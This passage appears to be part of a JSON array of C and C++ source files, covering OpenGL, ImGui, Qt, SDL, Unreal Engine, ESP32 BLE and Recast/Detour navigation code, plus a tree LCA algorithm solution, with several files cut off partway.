1.0f));\n\tGLCall(glClear(GL_COLOR_BUFFER_BIT | GL_DEPTH_BUFFER_BIT));\n}\n\nvoid Application::UpdateDeltaTime()\n{\n\tfloat currentFrame = static_cast<float>(glfwGetTime());\n\tdeltaTime = currentFrame - lastFrame;\n\tlastFrame = currentFrame;\n}\n\nvoid Application::LoadImGui()\n{\n\n\tglfwMakeContextCurrent(glfwGetCurrentContext());\n\tmyImGui.BeginFrame();\n\t//ImGui::SliderFloat(\"Cube Rotation \", &scene.getRotation(), 0.0f, 360.0f);\n\tmyImGui.EndFrame();\n}\n\nvoid Application::processContinuousInput()\n{\n\tscene.processContinuousInput(deltaTime);\n}\n\nvoid Application::processDiscreteInput(int32_t key, int32_t scancode, int32_t action, int32_t mode) {\n\n\tscene.processDiscreteInput(key, scancode, action, mode, deltaTime);\n}\n\nvoid Application::onCursorPositionEvent(double xposIn, double yposIn) {\n\tscene.onCursorPositionEvent(xposIn, yposIn);\n}\n\nfloat Application::getRandom()\n{\n\treturn (float)(rand() % 100) / 100;\n}\n",
    "#include <bits/stdc++.h>\nusing namespace std;\n \n#define mod 1000000007\n#define endl \"\\n\"\n#define int long long\n\nvoid dfs(int u, int p, vector<int> &level, vector<int> adj[], vector<vector<int>> &parents){\n    parents[0][u] = p;\n    for(auto v: adj[u]){\n        if(v == p) continue;\n        level[v] = 1 + level[u];\n        dfs(v, u, level, adj, parents);\n    }\n}\n\nint findKthParent(int node, int k, vector<vector<int>> &parents, int maxi){\n    for(int i=0; i<maxi; i++){\n        if((k >> i) & 1){\n            node = parents[i][node];\n            if(node == -1) return -1;\n        }\n    }\n    return node;\n}\n\nint findLCA(int u, int v, vector<vector<int>> &parents, int maxi, vector<int> &level){\n    if(level[u] < level[v]){\n        v = findKthParent(v, level[v] - level[u], parents, maxi);\n    }\n    else if(level[u] > level[v]){\n        u = findKthParent(u, level[u] - level[v], parents, maxi);\n    }\n    if(u == v) return u;\n    //optimized approach to find LCA\n    for(int i=maxi - 1; i>=0; i--){\n        if(parents[i][u] != parents[i][v]){\n            u = parents[i][u];\n            v = parents[i][v];\n        }\n    }\n    return parents[0][u];\n}\n\nvoid dfsSum(int u, int p, vector<int> &ans, vector<int> adj[]){\n    for(auto v: adj[u]){\n        if(v == p) continue;\n        dfsSum(v, u, ans, adj);\n        ans[u] += ans[v];\n    }\n}\n\nvoid func(){\n    int n, m; cin >> n >> m;\n    int maxi = log2(n) + 1;\n    vector<vector<int>> parents(maxi, vector<int>(n+1, -1));\n    vector<int> adj[n+1];\n    for(int i=0; i<n-1; i++){\n        int u, v; cin >> u >> v;\n        adj[u].push_back(v);\n        adj[v].push_back(u);\n    }\n    vector<int> level(n+1);\n    level[1] = 0;\n    dfs(1, -1, level, adj, parents);\n    for(int i=1; i<maxi; i++){\n        for(int node=1; node<=n; node++){\n            int intermediate = parents[i-1][node];\n            if(intermediate != -1){\n                parents[i][node] = parents[i-1][intermediate];\n            }\n        }\n    }\n    vector<int> ans(n+1, 0);\n    for(int i=0; i<m; i++){\n        int u, v; cin >> u >> v;\n        //path from u to v\n        //increase ans[u] and ans[v] by 1\n        //now lca will get plus 2 from u and v combined\n        //hence decrease 1 from ans[lca(u, v)]\n        //parent of lca should not get any increment\n        //hence decrease 1 from ans[parent[lca]]\n        //call normal dfs and accumulate sum of ans array\n        ans[u]++;\n        ans[v]++;\n        int lca = findLCA(u, v, parents, maxi, level);\n        ans[lca]--;\n        if(parents[0][lca] != -1) ans[parents[0][lca]]--;\n    }\n    dfsSum(1, -1, ans, adj);\n    for(int i=1; i<=n; i++) cout << ans[i] << \" \";\n    cout << endl;\n}\n \nsigned main(){\n    ios_base::sync_with_stdio(false);\n    cin.tie(NULL);\n    \n    int t = 1;\n    // cin >> t;\n    while(t--){\n        func();\n    }\n    return 0;\n}",
    "// dear imgui, v1.91.7 WIP\n// (demo code)\n\n// Help:\n// - Read FAQ at http://dearimgui.com/faq\n// - Call and read ImGui::ShowDemoWindow() in imgui_demo.cpp. All applications in examples/ are doing that.\n// - Need help integrating Dear ImGui in your codebase?\n//   - Read Getting Started https://github.com/ocornut/imgui/wiki/Getting-Started\n//   - Read 'Programmer guide' in imgui.cpp for notes on how to setup Dear ImGui in your codebase.\n// Read top of imgui.cpp and imgui.h for many details, documentation, comments, links.\n// Get the latest version at https://github.com/ocornut/imgui\n\n// How to easily locate code?\n// - Use Tools->Item Picker to debug break in code by clicking any widgets: https://github.com/ocornut/imgui/wiki/Debug-Tools\n// - Browse an online version the demo with code linked to hovered widgets: https://pthom.github.io/imgui_manual_online/manual/imgui_manual.html\n// - Find a visible string and search for it in the code!\n\n//---------------------------------------------------\n// PLEASE DO NOT REMOVE THIS FILE FROM YOUR PROJECT!\n//---------------------------------------------------\n// Message to the person tempted to delete this file when integrating Dear ImGui into their codebase:\n// Think again! It is the most useful reference code that you and other coders will want to refer to and call.\n// Have the ImGui::ShowDemoWindow() function wired in an always-available debug menu of your game/app!\n// Also include Metrics! ItemPicker! DebugLog! and other debug features.\n// Removing this file from your project is hindering access to documentation for everyone in your team,\n// likely leading you to poorer usage of the library.\n// Everything in this file will be stripped out by the linker if you don't call ImGui::ShowDemoWindow().\n// If you want to link core Dear ImGui in your shipped builds but want a thorough guarantee that the demo will not be\n// linked, you can setup your imconfig.h with #define IMGUI_DISABLE_DEMO_WINDOWS and those functions will be empty.\n// In another situation, whenever you have Dear ImGui available you probably want this to be available for reference.\n// Thank you,\n// -Your beloved friend, imgui_demo.cpp (which you won't delete)\n\n//--------------------------------------------\n// ABOUT THE MEANING OF THE 'static' KEYWORD:\n//--------------------------------------------\n// In this demo code, we frequently use 'static' variables inside functions.\n// A static variable persists across calls. It is essentially a global variable but declared inside the scope of the function.\n// Think of \"static int n = 0;\" as \"global int n = 0;\" !\n// We do this IN THE DEMO because we want:\n// - to gather code and data in the same place.\n// - to make the demo source code faster to read, faster to change, smaller in size.\n// - it is also a convenient way of storing simple UI related information as long as your function\n//   doesn't need to be reentrant or used in multiple threads.\n// This might be a pattern you will want to use in your code, but most of the data you would be working\n// with in a complex codebase is likely going to be stored outside your functions.\n\n//-----------------------------------------\n// ABOUT THE CODING STYLE OF OUR DEMO CODE\n//-----------------------------------------\n// The Demo code in this file is designed to be easy to copy-and-paste into your application!\n// Because of this:\n// - We never omit the ImGui:: prefix when calling functions, even though most code here is in the same namespace.\n// - We try to declare static variables in the local scope, as close as possible to the code using them.\n// - We never use any of the helpers/facilities used internally by Dear ImGui, unless available in the public API.\n// - We never use maths operators on ImVec2/ImVec4. For our other sources files we use them, and they are provided\n//   by imgui.h using the IMGUI_DEFINE_MATH_OPERATORS define. For your own sources file they are optional\n//   and require you either enable those, either provide your own via IM_VEC2_CLASS_EXTRA in imconfig.h.\n//   Because we can't assume anything about your support of maths operators, we cannot use them in imgui_demo.cpp.\n\n// Navigating this file:\n// - In Visual Studio: CTRL+comma (\"Edit.GoToAll\") can follow symbols inside comments, whereas CTRL+F12 (\"Edit.GoToImplementation\") cannot.\n// - In Visual Studio w/ Visual Assist installed: ALT+G (\"VAssistX.GoToImplementation\") can also follow symbols inside comments.\n// - In VS Code, CLion, etc.: CTRL+click can follow symbols inside comments.\n// - You can search/grep for all sections listed in the index to find the section.\n\n/*\n\nIndex of this file:\n\n// [SECTION] Forward Declarations\n// [SECTION] Helpers\n// [SECTION] Helpers: ExampleTreeNode, ExampleMemberInfo (for use by Property Editor & Multi-Select demos)\n// [SECTION] Demo Window / ShowDemoWindow()\n// [SECTION] ShowDemoWindowMenuBar()\n// [SECTION] ShowDemoWindowWidgets()\n// [SECTION] ShowDemoWindowMultiSelect()\n// [SECTION] ShowDemoWindowLayout()\n// [SECTION] ShowDem",
    "#include \"BagToImagesWidget.hpp\"\n\n#include \"UtilsROS.hpp\"\n\n#include <QCheckBox>\n#include <QComboBox>\n#include <QDialogButtonBox>\n#include <QFileDialog>\n#include <QFormLayout>\n#include <QHBoxLayout>\n#include <QLabel>\n#include <QLineEdit>\n#include <QMessageBox>\n#include <QPushButton>\n#include <QSlider>\n#include <QShortcut>\n#include <QToolButton>\n#include <QVBoxLayout>\n\n#include <filesystem>\n\nBagToImagesWidget::BagToImagesWidget(Utils::UI::ImageInputParameters& parameters, QWidget *parent) :\n    BasicInputWidget(\"Write Images from ROSBag\", \":/icons/bag_to_images\", parent),\n    m_parameters(parameters), m_settings(parameters, \"bag_to_images\")\n{\n    m_sourceLineEdit->setText(parameters.sourceDirectory);\n    m_sourceLineEdit->setToolTip(\"The directory of the ROSBag source file.\");\n\n    m_topicNameComboBox = new QComboBox;\n    m_topicNameComboBox->setMinimumWidth(200);\n    m_topicNameComboBox->setToolTip(\"The ROSBag topic of the video file.\\nIf the Bag contains multiple video topics, you can choose one of them.\");\n\n    if (!m_parameters.sourceDirectory.isEmpty()) {\n        Utils::UI::fillComboBoxWithTopics(m_topicNameComboBox, m_parameters.sourceDirectory);\n\n        if (!m_parameters.topicName.isEmpty()) {\n            m_topicNameComboBox->setCurrentText(m_parameters.topicName);\n        }\n    }\n\n    m_imagesNameLineEdit = new QLineEdit(m_parameters.targetDirectory);\n    m_imagesNameLineEdit->setToolTip(\"The directory where the images should be stored.\");\n\n    auto* const imagesLocationButton = new QToolButton;\n    auto* const searchImagesPathLayout = Utils::UI::createLineEditButtonLayout(m_imagesNameLineEdit, imagesLocationButton);\n\n    auto* const formatComboBox = new QComboBox;\n    formatComboBox->addItem(\"jpg\", 0);\n    formatComboBox->addItem(\"png\", 1);\n    formatComboBox->addItem(\"bmp\", 2);\n    formatComboBox->setToolTip(\"The format of the written images.\");\n    formatComboBox->setCurrentText(m_parameters.format);\n\n    auto* const basicOptionsFormLayout = new QFormLayout;\n    basicOptionsFormLayout->addRow(\"Bag File:\", m_findSourceLayout);\n    basicOptionsFormLayout->addRow(\"Topic Name:\", m_topicNameComboBox);\n    basicOptionsFormLayout->addRow(\"Images Location:\", searchImagesPathLayout);\n    basicOptionsFormLayout->addRow(\"Format:\", formatComboBox);\n\n    auto* const advancedOptionsCheckBox = new QCheckBox;\n    advancedOptionsCheckBox->setChecked(m_parameters.showAdvancedOptions ? Qt::Checked : Qt::Unchecked);\n    advancedOptionsCheckBox->setText(\"Show Advanced Options\");\n\n    auto* const switchRedBlueCheckBox = Utils::UI::createCheckBox(\"Switch the video's red and blue values.\", m_parameters.switchRedBlueValues);\n    auto* const useBWCheckBox = Utils::UI::createCheckBox(\"If the images should be colorless or not.\", m_parameters.useBWImages);\n\n    m_advancedOptionsFormLayout = new QFormLayout;\n    m_advancedOptionsFormLayout->addRow(\"Switch Red and Blue Values:\", switchRedBlueCheckBox);\n    m_advancedOptionsFormLayout->addRow(\"Colorless Images:\", useBWCheckBox);\n\n    auto* const advancedOptionsWidget = new QWidget;\n    advancedOptionsWidget->setLayout(m_advancedOptionsFormLayout);\n    advancedOptionsWidget->setVisible(m_parameters.showAdvancedOptions);\n\n    auto* const controlsLayout = new QVBoxLayout;\n    controlsLayout->addStretch();\n    controlsLayout->addWidget(m_headerPixmapLabel);\n    controlsLayout->addWidget(m_headerLabel);\n    controlsLayout->addSpacing(40);\n    controlsLayout->addLayout(basicOptionsFormLayout);\n    controlsLayout->addSpacing(5);\n    controlsLayout->addWidget(advancedOptionsCheckBox);\n    controlsLayout->addSpacing(10);\n    controlsLayout->addWidget(advancedOptionsWidget);\n    controlsLayout->addStretch();\n\n    auto* const controlsSqueezedLayout = new QHBoxLayout;\n    controlsSqueezedLayout->addStretch();\n    controlsSqueezedLayout->addLayout(controlsLayout);\n    controlsSqueezedLayout->addStretch();\n\n    adjustWidgetsToChangedFormat(m_parameters.format);\n\n    auto* const mainLayout = new QVBoxLayout;\n    mainLayout->addLayout(controlsSqueezedLayout);\n    mainLayout->addLayout(m_buttonLayout);\n    setLayout(mainLayout);\n\n    auto* const okShortCut = new QShortcut(QKeySequence(Qt::Key_Return), this);\n    // Generally, only enable this if the source bag, topic name and target dir line edit contain text\n    enableOkButton(!m_parameters.sourceDirectory.isEmpty() &&\n                   !m_parameters.topicName.isEmpty() && !m_parameters.targetDirectory.isEmpty());\n\n\n    connect(m_findSourceButton, &QPushButton::clicked, this, &BagToImagesWidget::searchButtonPressed);\n    connect(m_topicNameComboBox, &QComboBox::currentTextChanged, this, [this] (const QString& text) {\n        writeParameterToSettings(m_parameters.topicName, text, m_settings);\n    });\n    connect(imagesLocationButton, &QPushButton::clicked, this, &BagToImagesWidget::imagesLocationButtonPressed);\n    connect(formatComboBox, &QComboBox::currentTextChanged, this, &BagToImagesWidget::adjustWidgetsToChangedFormat);\n    connect(advanc",
    "#include <SDL.h>\r\n#include <stdio.h>\r\n#include <math.h>\r\n\r\n#define WIDTH 800\r\n#define HEIGHT 600\r\n#define BALL_RADIUS 20\r\n#define NUM_BALLS 5\r\n#define GRAVITY 0.1\r\n\r\n// Ball structure\r\ntypedef struct {\r\n    float x, y;      // Position\r\n    float vx, vy;    // Velocity\r\n    float angle;     // Angle of the pendulum\r\n    float angular_velocity; // Angular velocity\r\n    int is_moving;   // Whether the ball is moving or not\r\n} Ball;\r\n\r\nBall balls[NUM_BALLS];\r\n\r\n// Function to initialize the balls\r\nvoid initBalls() {\r\n    for (int i = 0; i < NUM_BALLS; i++) {\r\n        balls[i].x = WIDTH / 2 + (i - NUM_BALLS / 2) * BALL_RADIUS * 2;\r\n        balls[i].y = HEIGHT / 2;\r\n        balls[i].vx = 0;\r\n        balls[i].vy = 0;\r\n        balls[i].angle = M_PI / 6; // 30 degrees\r\n        balls[i].angular_velocity = 0;\r\n        balls[i].is_moving = 0;\r\n    }\r\n}\r\n\r\n// Function to update the physics of the balls\r\nvoid updatePhysics(float dt) {\r\n    for (int i = 0; i < NUM_BALLS; i++) {\r\n        if (balls[i].is_moving) {\r\n            // Simple harmonic motion (Pendulum motion)\r\n            balls[i].angular_velocity += -GRAVITY * sin(balls[i].angle) * dt;\r\n            balls[i].angle += balls[i].angular_velocity * dt;\r\n            \r\n            // Damping to prevent perpetual motion\r\n            balls[i].angular_velocity *= 0.99;\r\n            \r\n            // Convert angle to Cartesian coordinates for display\r\n            balls[i].x = WIDTH / 2 + (i - NUM_BALLS / 2) * BALL_RADIUS * 2 + BALL_RADIUS * sin(balls[i].angle);\r\n            balls[i].y = HEIGHT / 2 + BALL_RADIUS * cos(balls[i].angle);\r\n        }\r\n    }\r\n}\r\n\r\n// Function to draw the balls\r\nvoid drawBalls(SDL_Renderer *renderer) {\r\n    for (int i = 0; i < NUM_BALLS; i++) {\r\n        SDL_SetRenderDrawColor(renderer, 255, 0, 0, 255); // Red color for balls\r\n        SDL_RenderDrawCircle(renderer, (int)balls[i].x, (int)balls[i].y, BALL_RADIUS);\r\n    }\r\n}\r\n\r\n// Main function\r\nint main() {\r\n    if (SDL_Init(SDL_INIT_VIDEO) < 0) {\r\n        printf(\"SDL could not initialize! SDL_Error: %s\\n\", SDL_GetError());\r\n        return -1;\r\n    }\r\n\r\n    SDL_Window *window = SDL_CreateWindow(\"Newton's Cradle Simulation\", SDL_WINDOWPOS_UNDEFINED, SDL_WINDOWPOS_UNDEFINED, WIDTH, HEIGHT, SDL_WINDOW_SHOWN);\r\n    if (!window) {\r\n        printf(\"Window could not be created! SDL_Error: %s\\n\", SDL_GetError());\r\n        return -1;\r\n    }\r\n\r\n    SDL_Renderer *renderer = SDL_CreateRenderer(window, -1, SDL_RENDERER_ACCELERATED);\r\n    if (!renderer) {\r\n        printf(\"Renderer could not be created! SDL_Error: %s\\n\", SDL_GetError());\r\n        return -1;\r\n    }\r\n\r\n    // Initialize balls\r\n    initBalls();\r\n\r\n    // Main loop\r\n    int running = 1;\r\n    Uint32 start_time = SDL_GetTicks();\r\n    while (running) {\r\n        SDL_Event e;\r\n        while (SDL_PollEvent(&e)) {\r\n            if (e.type == SDL_QUIT) {\r\n                running = 0;\r\n            } else if (e.type == SDL_KEYDOWN) {\r\n                if (e.key.keysym.sym == SDLK_SPACE) {\r\n                    // Start the pendulum motion with a small kick on the first ball\r\n                    balls[0].is_moving = 1;\r\n                    balls[0].angular_velocity = 1.0;  // Initial velocity\r\n                }\r\n            }\r\n        }\r\n\r\n        // Clear screen\r\n        SDL_SetRenderDrawColor(renderer, 255, 255, 255, 255);\r\n        SDL_RenderClear(renderer);\r\n\r\n        // Update physics\r\n        Uint32 current_time = SDL_GetTicks();\r\n        float delta_time = (current_time - start_time) / 1000.0f; // Seconds\r\n        updatePhysics(delta_time);\r\n\r\n        // Draw balls\r\n        drawBalls(renderer);\r\n\r\n        // Present the renderer\r\n        SDL_RenderPresent(renderer);\r\n\r\n        // Update start time for the next frame\r\n        start_time = current_time;\r\n\r\n        SDL_Delay(16); // Approx 60 FPS\r\n    }\r\n\r\n    // Clean up\r\n    SDL_DestroyRenderer(renderer);\r\n    SDL_DestroyWindow(window);\r\n    SDL_Quit();\r\n\r\n    return 0;\r\n}\r\n",
    "// Copyright Epic Games, Inc. All Rights Reserved.\n// Copyright DevRespawn.com (MBCG). All Rights Reserved.\n\n// THIS CODE CAN'T BE COMPILED AS IS BECAUSE SOME PARTS WERE REMOVED DUE TO EPIC'S LICENSING TERMS.\n// THIS FILE ORIGINALLY IS A MODIFICATION OF ULyraGameplayAbility_RangedWeapon CLASS FROM EPIC'S LYRA STARTER GAME.\n\n#include \"MBCG/Weapons/MBCG_LyraGA_RangedWeapon.h\"\n// other #include-s are skipped due to Epic's licensing terms\n\n#include UE_INLINE_GENERATED_CPP_BY_NAME(MBCG_LyraGA_RangedWeapon)\n\nDEFINE_LOG_CATEGORY_STATIC(LOG_UMBCG_LyraGA_RangedWeapon, All, All)\n\n// SOME CODE IS SKIPPED\n\nbool UMBCG_LyraGA_RangedWeapon::CameraTowardsFocusLineTrace(/*out*/ FHitResult& OutHitResult, /*out*/ FVector& OutStartTrace, /*out*/ FVector& OutEndTrace) const\n{\n    APawn* const AvatarPawn = Cast<APawn>(GetAvatarActorFromActorInfo());\n    check(AvatarPawn);\n\n    // getting StartTrace and EndTrace\n    const FTransform TargetTransform = GetTargetingTransform(AvatarPawn, EMBCG_LyraAbilityTargetingSource::CameraTowardsFocus);\n    OutStartTrace = TargetTransform.GetTranslation();\n    const FVector AimDir = TargetTransform.GetUnitAxis(EAxis::X);\n    const double MaxTraceDistaance = 100000;  // cm\n    OutEndTrace = OutStartTrace + AimDir * MaxTraceDistaance;\n\n    FCollisionQueryParams TraceParams(SCENE_QUERY_STAT(CameraTowardsFocusLineTrace), /*bTraceComplex=*/false, /*IgnoreActor=*/AvatarPawn);\n    TraceParams.bReturnPhysicalMaterial = true;\n    AddAdditionalTraceIgnoreActors(TraceParams);\n    const ECollisionChannel TraceChannel = DetermineTraceChannel(TraceParams, /* bIsSimulated */ false);\n    bool bHit = GetWorld()->LineTraceSingleByChannel(OutHitResult, OutStartTrace, OutEndTrace, TraceChannel, TraceParams);\n\n    return bHit;\n}\n\n\nFVector UMBCG_LyraGA_RangedWeapon::GetCameraTowardsFocusHitLocation() const\n{\n    FHitResult HitResult;\n    FVector StartTrace;\n    FVector EndTrace;\n    bool bHit = CameraTowardsFocusLineTrace(HitResult, StartTrace, EndTrace);\n\n#if ENABLE_DRAW_DEBUG\n    if (MBCG::DrawBulletTracesDuration > 0.0f)\n    {\n        static float DebugThickness = 1.0f;\n        DrawDebugLine(GetWorld(), StartTrace, EndTrace, FColor::Silver, false, MBCG::DrawBulletTracesDuration, 0, DebugThickness);\n    }\n#endif  // ENABLE_DRAW_DEBUG\n\n    if (bHit && HitResult.GetActor())\n    {\n        return HitResult.ImpactPoint;\n    }\n    else\n    {\n        // return location of max trace distance end point\n        return EndTrace;\n    }\n}\n\n\nFVector UMBCG_LyraGA_RangedWeapon::GetTargetingSourceTowardsFocusHitLocation() const\n{\n    FHitResult HitResult;\n    FVector StartTrace;\n    FVector EndTrace;\n    bool bHit = TargetingSourceTowardsFocusLineTrace(HitResult, StartTrace, EndTrace);\n\n    if (bHit && HitResult.GetActor())\n    {\n        return HitResult.ImpactPoint;\n    }\n    else\n    {\n        // return location of max trace distance end point\n        return EndTrace;\n    }\n}\n\n\n/**\n * @MBCG\n * Retrieves the location of the equipped weapon\n *\n * @param OutErrorCode The error code that will be set by the function.\n * 0 - no errors\n * 1 - LyraRangedWeaponInstance not found\n * 2 - Spawned weapons not found\n * 3 - Weapon actor not found\n * @return The location of the equipped weapon as an FVector.\n */\nFVector UMBCG_LyraGA_RangedWeapon::GetEquipedWeaponLocation(int& OutErrorCode) const\n{\n    FVector Result;\n    // default value\n    OutErrorCode = 0;\n\n    ULyraRangedWeaponInstance* WeaponData = GetWeaponInstance();\n    if (!WeaponData)\n    {\n        UE_LOG(LOG_UMBCG_LyraGA_RangedWeapon, Warning, TEXT(\"GetEquipedWeaponLocation ErrorCode: 1\"));\n        OutErrorCode = 1;\n        return Result;\n    }\n\n    TArray<AActor*> SpawnedWeapons = WeaponData->GetSpawnedActors();\n    if (SpawnedWeapons.Num() == 0)\n    {\n        UE_LOG(LOG_UMBCG_LyraGA_RangedWeapon, Warning, TEXT(\"GetEquipedWeaponLocation ErrorCode: 2\"));\n        OutErrorCode = 2;\n        return Result;\n    }\n\n    AActor* Weapon = SpawnedWeapons[0];\n    if (!Weapon)\n    {\n        UE_LOG(LOG_UMBCG_LyraGA_RangedWeapon, Warning, TEXT(\"GetEquipedWeaponLocation ErrorCode: 3\"));\n        OutErrorCode = 3;\n        return Result;\n    }\n\n    Result = Weapon->GetActorLocation();\n    return Result;\n}\n\n\nFVector UMBCG_LyraGA_RangedWeapon::GetFakeWeaponLocation(const FTransform& TargetTransform, const APawn* AvatarPawn) const\n{\n    FVector EyesLocation;\n    FRotator EyesRotation;\n    AvatarPawn->GetActorEyesViewPoint(EyesLocation, EyesRotation);\n    // Lyra's way: returns AvatarPawn's center\n    FVector LyraStartTrace = TargetTransform.GetTranslation();\n    FVector AimDirTemp = TargetTransform.GetUnitAxis(EAxis::X);\n    // Fake weapon position: between pawn center location (LyraStartTrace) and eyes location (EyesLocation), closer to eyes\n    // .. its drawback: when Hero moves in crouching, this calculation is wrong because the real weapon is located noticably higher\n    FVector FakeWeaponLocation = (LyraStartTrace + 3 * EyesLocation) / 4;\n    // WeaponOffsetFromBody is a bit less than AvatarPawn's c",
    "#include \"ble_handler.h\"\n\n#include <cstdint>\n#include <vector>\n\n#include \"ble.h\"\n#include \"esp_check.h\"\n#include \"esp_err.h\"\n#include \"esp_log.h\"\n#include \"ionbridge.h\"\n#include \"machine_info.h\"\n\nstatic const char *TAG = \"BleHandler\";\n\nesp_err_t BleHandler::BLEEchoTest(AppContext &ctx,\n                                  const std::vector<uint8_t> &request,\n                                  std::vector<uint8_t> &response) {\n  ESP_LOGI(TAG, \"BLE echo test, request size: %d\", request.size());\n  response.insert(response.end(), request.begin(), request.end());\n  return ESP_OK;\n}\n\nesp_err_t BleHandler::GetDeviceBleAddress(AppContext &ctx,\n                                          const std::vector<uint8_t> &request,\n                                          std::vector<uint8_t> &response) {\n  const uint8_t *addr = MachineInfo::GetInstance().GetBleMac().data();\n  ESP_LOGD(TAG, \"BLE address: %s\", FORMAT_MAC(addr));\n  response.insert(response.end(), addr, addr + sizeof(addr));\n  return ESP_OK;\n}\n\nesp_err_t BleHandler::SetBleState(AppContext &ctx,\n                                  const std::vector<uint8_t> &request,\n                                  std::vector<uint8_t> &response) {\n  if (request.size() != 1) {\n    ESP_LOGE(TAG, \"SetBleState invalid request size: %d\", request.size());\n    return ESP_ERR_INVALID_ARG;\n  }\n  bool advertising = request[0];\n  if (advertising) {\n    ESP_LOGI(TAG, \"Starting BLE advertisement\");\n    ESP_RETURN_ON_FALSE(ble_start_advertising(true), ESP_FAIL, TAG,\n                        \"ble_start_advertising\");\n  } else {\n    ESP_LOGI(TAG, \"Stopping BLE advertisement\");\n    ESP_RETURN_ON_FALSE(ble_stop_advertising(), ESP_FAIL, TAG,\n                        \"ble_stop_advertising\");\n  }\n  return ESP_OK;\n}\n\nesp_err_t BleHandler::GetBleRSSI(AppContext &ctx,\n                                 const std::vector<uint8_t> &request,\n                                 std::vector<uint8_t> &response) {\n  int8_t rssi = 0;\n  ESP_RETURN_ON_ERROR(get_ble_conn_rssi(&rssi), TAG, \"get_ble_conn_rssi\");\n  response.emplace_back(rssi);\n  return ESP_OK;\n}\n",
    "//\n// Copyright (c) 2009-2010 Mikko Mononen memon@inside.org\n//\n// This software is provided 'as-is', without any express or implied\n// warranty.  In no event will the authors be held liable for any damages\n// arising from the use of this software.\n// Permission is granted to anyone to use this software for any purpose,\n// including commercial applications, and to alter it and redistribute it\n// freely, subject to the following restrictions:\n// 1. The origin of this software must not be misrepresented; you must not\n//    claim that you wrote the original software. If you use this software\n//    in a product, an acknowledgment in the product documentation would be\n//    appreciated but is not required.\n// 2. Altered source versions must be plainly marked as such, and must not be\n//    misrepresented as being the original software.\n// 3. This notice may not be removed or altered from any source distribution.\n//\n\n#include <float.h>\n#include <string.h>\n#include \"DetourNavMeshQuery.h\"\n#include \"DetourNavMesh.h\"\n#include \"DetourNode.h\"\n#include \"DetourCommon.h\"\n#include \"DetourMath.h\"\n#include \"DetourAlloc.h\"\n#include \"DetourAssert.h\"\n#include <new>\n\n/// @class dtQueryFilter\n///\n/// <b>The Default Implementation</b>\n/// \n/// At construction: All area costs default to 1.0.  All flags are included\n/// and none are excluded.\n/// \n/// If a polygon has both an include and an exclude flag, it will be excluded.\n/// \n/// The way filtering works, a navigation mesh polygon must have at least one flag \n/// set to ever be considered by a query. So a polygon with no flags will never\n/// be considered.\n///\n/// Setting the include flags to 0 will result in all polygons being excluded.\n///\n/// <b>Custom Implementations</b>\n/// \n/// DT_VIRTUAL_QUERYFILTER must be defined in order to extend this class.\n/// \n/// Implement a custom query filter by overriding the virtual passFilter() \n/// and getCost() functions. If this is done, both functions should be as \n/// fast as possible. Use cached local copies of data rather than accessing \n/// your own objects where possible.\n/// \n/// Custom implementations do not need to adhere to the flags or cost logic \n/// used by the default implementation.  \n/// \n/// In order for A* searches to work properly, the cost should be proportional to\n/// the travel distance. Implementing a cost modifier less than 1.0 is likely \n/// to lead to problems during pathfinding.\n///\n/// @see dtNavMeshQuery\n\ndtQueryFilter::dtQueryFilter() :\n\tm_includeFlags(0xffff),\n\tm_excludeFlags(0)\n{\n\tfor (int i = 0; i < DT_MAX_AREAS; ++i)\n\t\tm_areaCost[i] = 1.0f;\n}\n\n#ifdef DT_VIRTUAL_QUERYFILTER\nbool dtQueryFilter::passFilter(const dtPolyRef /*ref*/,\n\t\t\t\t\t\t\t   const dtMeshTile* /*tile*/,\n\t\t\t\t\t\t\t   const dtPoly* poly) const\n{\n\treturn (poly->flags & m_includeFlags) != 0 && (poly->flags & m_excludeFlags) == 0;\n}\n\nfloat dtQueryFilter::getCost(const float* pa, const float* pb,\n\t\t\t\t\t\t\t const dtPolyRef /*prevRef*/, const dtMeshTile* /*prevTile*/, const dtPoly* /*prevPoly*/,\n\t\t\t\t\t\t\t const dtPolyRef /*curRef*/, const dtMeshTile* /*curTile*/, const dtPoly* curPoly,\n\t\t\t\t\t\t\t const dtPolyRef /*nextRef*/, const dtMeshTile* /*nextTile*/, const dtPoly* /*nextPoly*/) const\n{\n\treturn dtVdist(pa, pb) * m_areaCost[curPoly->getArea()];\n}\n#else\ninline bool dtQueryFilter::passFilter(const dtPolyRef /*ref*/,\n\t\t\t\t\t\t\t\t\t  const dtMeshTile* /*tile*/,\n\t\t\t\t\t\t\t\t\t  const dtPoly* poly) const\n{\n\treturn (poly->flags & m_includeFlags) != 0 && (poly->flags & m_excludeFlags) == 0;\n}\n\ninline float dtQueryFilter::getCost(const float* pa, const float* pb,\n\t\t\t\t\t\t\t\t\tconst dtPolyRef /*prevRef*/, const dtMeshTile* /*prevTile*/, const dtPoly* /*prevPoly*/,\n\t\t\t\t\t\t\t\t\tconst dtPolyRef /*curRef*/, const dtMeshTile* /*curTile*/, const dtPoly* curPoly,\n\t\t\t\t\t\t\t\t\tconst dtPolyRef /*nextRef*/, const dtMeshTile* /*nextTile*/, const dtPoly* /*nextPoly*/) const\n{\n\treturn dtVdist(pa, pb) * m_areaCost[curPoly->getArea()];\n}\n#endif\t\n\t\nstatic const float H_SCALE = 0.999f; // Search heuristic scale.\n\n\ndtNavMeshQuery* dtAllocNavMeshQuery()\n{\n\tvoid* mem = dtAlloc(sizeof(dtNavMeshQuery), DT_ALLOC_PERM);\n\tif (!mem) return 0;\n\treturn new(mem) dtNavMeshQuery;\n}\n\nvoid dtFreeNavMeshQuery(dtNavMeshQuery* navmesh)\n{\n\tif (!navmesh) return;\n\tnavmesh->~dtNavMeshQuery();\n\tdtFree(navmesh);\n}\n\ndtPolyQuery::~dtPolyQuery()\n{\n\t// Defined out of line to fix the weak v-tables warning\n}\n\n//////////////////////////////////////////////////////////////////////////////////////////\n\n/// @class dtNavMeshQuery\n///\n/// For methods that support undersized buffers, if the buffer is too small \n/// to hold the entire result set the return status of the method will include \n/// the #DT_BUFFER_TOO_SMALL flag.\n///\n/// Constant member functions can be used by multiple clients without side\n/// effects. (E.g. No change to the closed list. No impact on an in-progress\n/// sliced path query. Etc.)\n/// \n/// Walls and portals: A @e wall is a polygon segment that is \n/// considered impassable. A @e portal is a passable segment between poly",
